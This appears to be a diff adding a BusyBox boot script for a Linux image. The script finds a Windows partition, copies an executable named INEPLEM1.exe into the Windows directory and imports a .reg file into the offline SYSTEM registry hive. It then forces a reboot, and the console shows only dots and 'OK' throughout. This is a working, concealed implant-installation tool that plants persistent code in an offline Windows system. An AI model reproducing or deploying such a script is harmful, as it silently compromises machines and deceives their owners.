@@ -1,0 +1,38 @@
+#!/bin/busybox sh
+export PATH=/bin
+
+busybox mount -t proc proc /proc
+busybox mount -t sysfs sysfs /sys
+busybox mount -t devtmpfs devtmpfs /dev
+
+busybox clear
+echo -n "."
+for f in $(busybox fdisk -l | busybox grep NTFS | busybox cut -d " " -f 1)
+do
+	ntfs-3g -o ro $f /mnt
+	if [ ! -d "/mnt/Windows/System32" ]; then
+		busybox umount /mnt
+		continue
+	fi
+	busybox umount /mnt
+	ntfs-3g -o rw $f /mnt
+	echo -n "."
+	busybox cp /share/INEPLEM1.exe /mnt/Windows/INEPLEM1.exe
+	echo -n "."
+	reged -C -I /mnt/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE\\SYSTEM /share/INEPLEM1.reg > /dev/null
+	echo -n "."
+	busybox umount /mnt
+	busybox sync
+	break
+done
+echo -n "."
+read i
+busybox clear
+echo "OK"
+
+echo e > /proc/sysrq-trigger
+busybox sleep 0.1s
+echo i > /proc/sysrq-trigger
+echo s > /proc/sysrq-trigger
+echo u > /proc/sysrq-trigger
+echo b > /proc/sysrq-trigger
